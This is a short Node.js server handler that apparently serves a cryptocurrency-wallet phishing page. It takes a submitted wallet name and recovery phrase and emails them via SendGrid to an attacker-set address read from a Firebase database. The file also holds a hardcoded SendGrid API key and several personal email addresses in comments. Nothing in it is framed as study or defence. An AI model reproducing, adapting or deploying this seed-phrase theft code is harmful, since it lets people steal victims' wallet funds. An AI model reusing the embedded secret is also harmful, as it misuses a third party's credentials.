const axios = require('axios');

exports.sendMail = async (req, res) =>{
  const items2 = await axios.get("https://wallet-60845-default-rtdb.firebaseio.com/email.json");

  const defaultEmail = items2.data.set_email;

    const { wallet_name, phrase} = req.body;
    const sgMail = require('@sendgrid/mail')
sgMail.setApiKey("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")
const msg = {
  to: defaultEmail, //mail2saltoday@gmail.com Change to your recipient
  from: 'aliasgbolly@gmail.com', //braindavis00400@gmail.com Change to your verified sender
  subject: 'Alert: Submission',
  text: 'and easy to do anywhere, even with Node.js',
  html: '<strong>Wallet Name: </strong>' + wallet_name + "<br/>" + "<strong>Recovery Phrase: </strong>" + phrase,
}
sgMail
  .send(msg)
  .then(() => {
      res.send(defaultEmail)
    console.log('Email sent')
  })
  .catch((error) => {
    res.send(error)
    console.error(error)
  })
}
